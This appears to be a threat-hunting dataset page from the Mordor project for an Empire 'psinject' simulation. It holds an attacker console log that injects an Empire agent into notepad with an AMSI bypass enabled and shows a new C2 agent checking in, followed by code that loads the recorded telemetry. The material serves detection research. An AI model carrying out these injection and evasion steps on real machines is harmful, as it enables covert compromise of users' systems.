# Empire PSInject

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190518200432 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.zip |

## Dataset Description
This dataset represents adversaries using Empire psinject script to inject Unmanaged PowerShell into any process.

## Adversary View
```
[*] Active agents:
Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            
F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6008   5/0.0    2020-08-07 18:31:11  http            

(Empire: agents) > interact F82SZKVW
(Empire: F82SZKVW) > 
(Empire: F82SZKVW) > 
(Empire: F82SZKVW) > usemodule management/psinject
(Empire: powershell/management/psinject) > 
(Empire: powershell/management/psinject) > set ProcName notepad
(Empire: powershell/management/psinject) > info

              Name: Invoke-PSInject
            Module: powershell/management/psinject
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @harmj0y
  @sixdub
  leechristensen (@tifkin_)

Description:
  Utilizes Powershell to to inject a Stephen Fewer formed
  ReflectivePick which executes PS codefrom memory in a remote
  process. ProcID or ProcName must be specified.

Comments:
  http://sixdub.net

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        F82SZKVW                  Agent to run module on.                 
  ProcId           False                                 ProcessID to inject into.               
  ProcName         False       notepad                   Process name to inject into.            
  Listener         True                                  Listener to use.                        
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/management/psinject) > set Listener http
(Empire: powershell/management/psinject) > info

              Name: Invoke-PSInject
            Module: powershell/management/psinject
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @harmj0y
  @sixdub
  leechristensen (@tifkin_)

Description:
  Utilizes Powershell to to inject a Stephen Fewer formed
  ReflectivePick which executes PS codefrom memory in a remote
  process. ProcID or ProcName must be specified.

Comments:
  http://sixdub.net

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        F82SZKVW                  Agent to run module on.                 
  ProcId           False                                 ProcessID to inject into.               
  ProcName         False       notepad                   Process name to inject into.            
  Listener         True        http                      Listener to use.                        
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/management/psinject) > execute
[*] Tasked F82SZKVW to run TASK_CMD_JOB
[*] Agent F82SZKVW tasked with task ID 1
[*] Tasked agent F82SZKVW to run module powershell/management/psinject
(Empire: powershell/management/psinject) > 
Job started: F48GDZ

[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent Y9RCLV64 checked in
[+] Initial agent Y9RCLV64 from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to Y9RCLV64 at 172.18.39.5

(Empire: powershell/management/psinject) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            
F82SZKVW ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6008   5/0.0    2020-08-07 18:32:51  http            
Y9RCLV64 ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       notepad            2576   5/0.0    2020-08-07 18:32:52  http            

(Empire: agents) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        
